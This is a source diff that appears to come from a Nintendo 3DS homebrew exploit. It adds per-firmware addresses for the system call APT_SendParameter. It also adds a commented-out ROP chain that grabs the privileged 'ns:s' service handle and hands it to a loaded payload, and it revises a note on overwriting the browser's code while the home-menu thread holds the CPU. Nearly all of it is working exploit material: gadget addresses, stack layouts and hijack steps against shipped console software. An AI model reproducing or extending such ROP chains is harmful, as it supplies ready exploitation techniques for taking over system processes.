@@ -29,6 +29,8 @@ L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from o
 
 #define GSPGPU_Shutdown 0x0011dc1c
 #define GSPGPU_FlushDataCache 0x0014ab9c
+
+#define APT_SendParameter 0x00214ab0 //inr0=dst appid inr1=signaltype inr2=parambuf* inr3=parambufsize insp0=handle
 #else
 #define ROP_LOADR4_FROMOBJR0 0x10b64c
 #define ROP_POPPC 0x102028
@@ -94,6 +96,8 @@ L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from o
 #define GXLOW_CMD4 0x0014d65c
 
 #define GSPGPU_FlushDataCache 0x0014d55c
+
+#define APT_SendParameter 0x00205ba0
 #endif
 
 #if SYSVER <= 91 //v9.0-v9.1j
@@ -121,6 +125,8 @@ L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from o
 #define NSS_LaunchTitle 0x0020e6a8
 
 #define ORIGINALOBJPTR_LOADADR (0x002f1820+8)
+
+#define APT_SendParameter 0x00205c08
 #endif
 
 #if SYSVER == 94
@@ -342,6 +348,9 @@ nsslaunchtitle_programidlow_list:
 .word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00008802 @ KOR
 .word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00008802 @ TWN
 
+/*nss_servname:
+.ascii "ns:s"*/
+
 tmp_scratchdata:
 .space 0x400
 
@@ -433,9 +442,36 @@ ROP_SETLR ROP_POPPC
 .word POP_R1PC
 .word 0x0//0x100 @ r1
 
-.word svcSleepThread @ Sleep 1 second, call GSPGPU_Shutdown(), then execute svcSleepThread in an "infinite loop". The ARM11-kernel does not allow this homemenu thread and the browser thread to run at the same time(homemenu thread has priority over the browser thread). Therefore an "infinite loop" like the bx one below will result in execution of the browser thread completely stopping once any homemenu "infinite loop" begin execution. On Old3DS this means the below code will overwrite .text while the browser is attempting to clear .bss. On New3DS since overwriting .text+0 doesn't quite work(context-switching doesn't trigger at the right times), a different location in .text has to be overwritten instead.
+.word svcSleepThread @ Sleep 1 second, call GSPGPU_Shutdown() etc, then execute svcSleepThread in an "infinite loop". The ARM11-kernel does not allow this homemenu thread and the browser thread to run at the same time(homemenu thread has priority over the browser thread). Therefore an "infinite loop" like the bx one below will result in execution of the browser thread completely stopping once any homemenu "infinite loop" begin execution. On Old3DS this means the below code will overwrite .text while the browser is attempting to clear .bss. On New3DS since overwriting .text+0 doesn't quite work(context-switching doesn't trigger at the right times), a different location in .text has to be overwritten instead.
 
 CALLFUNC_NOARGS GSPGPU_Shutdown
+
+/*
+//Get "ns:s" service handle, then send it via APT_SendParameter(). The codebin payload can then use APT:ReceiveParameter to get this "ns:s" handle.
+CALLFUNC_NOSP SRV_GETSERVICEHANDLE, (HEAPBUF + (aptsendparam_handle - _start)), (HEAPBUF + (nss_servname - _start)), 0x4, 0
+
+ROP_SETLR POP_R2R6PC
+.word POP_R0PC
+.word 0x101 @ r0, dst appID
+
+.word POP_R1PC
+.word 0x1 @ r1, signaltype
+
+.word POP_R2R6PC
+.word 0 @ r2, parambuf*
+.word 0 @ r3, parambufsize
+.word 0 @ r4
+.word 0 @ r5
+.word 0 @ r6
+
+.word APT_SendParameter
+
+aptsendparam_handle:
+.word 0 @ sp0, handle
+.word 0
+.word 0
+.word 0
+.word 0 @ r6*/
 
 ropfinish_sleepthread:
 ROP_SETLR ROP_POPPC
